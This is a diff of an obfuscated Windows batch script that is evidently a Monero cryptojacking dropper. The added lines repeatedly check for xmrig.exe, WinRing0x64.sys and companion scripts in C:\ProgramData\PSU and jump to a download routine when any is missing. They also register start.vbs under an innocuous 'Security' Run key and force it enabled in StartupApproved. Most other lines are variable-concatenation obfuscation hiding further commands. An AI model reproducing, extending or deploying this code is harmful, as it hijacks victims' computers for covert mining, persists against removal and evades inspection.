@@ -144,6 +144,20 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aaaaaaaaaaaaaaaaa%%aa%%aaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaa%%aaaaa%%aa%*
@@ -293,6 +307,20 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -546,6 +574,20 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaa%%aaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aa%%aaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %bbbbbbbbbbbbbbbbb%%aa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%51.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %bb%%bbbbbbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbbbbbbbbb%%bbbbbbbb%%bbbbbbbbbb%%bbbbbbbbbbbbbbb%%bbbbbb%.%bbbbbb%%bbbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbb% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaaaa%%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -1029,6 +1071,20 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -1474,6 +1530,20 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -1664,7 +1734,25 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaa%\%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%001\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbb%%aaaa%%bb%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaa%\%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%002\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbb%%aaaa%%bb%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaa%\%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbb%%aaaa%%bb%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
-
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaa%\%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%001\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbb%%aaaa%%bbbbbbbbbbbbbbbbbbb%%aaaaaa%%aaaaaaaa%%bbbbbbbbbbbbbbbbbbbbbbb%%aaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaa%\%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%002\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbb%%aaaa%%bb%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
 %aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa% %aa%%aaaaa%%aaaaa% "%bbbbbbbbb%%bbbbbbbbbbbb%%bbbbbbbbbbbbb%%bbbbbbbbbbbbbb%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaa%\%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbb%%aaaa%%bb%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%" /%aaaaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbb%_%bbbbb%%bbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbbbbbbb%%bbbbb% /%aaaaa% 4 /%aaaaaaa%
@@ -1801,6 +1889,25 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa% (%aaaaaaaaaaaaaaaaaaaaaaaaa%86)\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
